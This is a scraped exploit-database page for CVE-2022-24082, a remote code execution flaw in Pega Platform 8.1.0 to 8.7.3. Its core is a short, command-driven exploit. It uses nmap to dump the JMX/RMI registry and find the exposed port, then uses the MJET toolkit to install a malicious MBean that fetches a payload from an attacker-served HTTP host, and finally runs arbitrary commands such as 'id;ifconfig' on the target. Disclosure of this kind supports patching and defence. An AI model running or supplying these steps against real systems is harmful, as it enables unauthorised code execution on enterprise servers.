---
title: Pega Platform 8.7.3 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022100063
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-25
fetch_date: 2025-10-03T20:45:42.063216
---

# Pega Platform 8.7.3 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pega Platform 8.7.3 Remote Code Execution** **2022.10.24**  **![pl](https://cert.cx/cxstatic/images/flags/pl.png) [Marcin Wolak](https://cxsecurity.com/author/Marcin%2BWolak/1/) **(PL)** ![pl](https://cert.cx/cxstatic/images/flags/pl.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-24082](https://cxsecurity.com/cveshow/CVE-2022-24082/ "Click to see CVE-2022-24082")**  CWE: **N/A** | |

# Exploit Title: Pega Platform 8.1.0 (and higher) Remote Code Execution
# Google Dork: N/A
# Date: 20 Oct 2022
# Exploit Author: Marcin Wolak (using MOGWAI LABS JMX Exploitation Toolkit)
# Vendor Homepage: www.pega.com
# Software Link: Not Available
# Version: 8.1.0 on-premise and higher, up to 8.7.3
# Tested on: Red Hat Enterprise 7
# CVE : CVE-2022-24082
;Dumping RMI registry:
nmap -sT -sV --script rmi-dumpregistry -p 9999 <IP Address>
;Extracting dynamic TCP port number from the dump (in form of @127.0.0.1:<PORT>)
;Verifying that the <PORT> is indeed open (it gives 127.0.0.1 in the RMI dump, but actually listens on the network as well):
nmap -sT -sV -p <PORT> <IP Address>
;Exploitation requires:
;- JVM
;- MOGWAI LABS JMX Exploitation Toolkit (https://github.com/mogwailabs/mjet)
;- jython
;Installing mbean for remote code execution
java -jar jython-standalone-2.7.2.jar mjet.py --localhost\_bypass <PORT> <IP Address> 9999 install random\_password http://<Local IP to Serve Payload over HTTP>:6666 6666
;Execution of commands id & ifconfig
java -jar jython-standalone-2.7.2.jar mjet.py --localhost\_bypass <PORT> <IP Address> 9999 command random\_password "id;ifconfig"
;More details: https://medium.com/@Marcin-Wolak/cve-2022-24082-rce-in-the-pega-platform-discovery-remediation-technical-details-long-live-69efb5437316

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100063)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top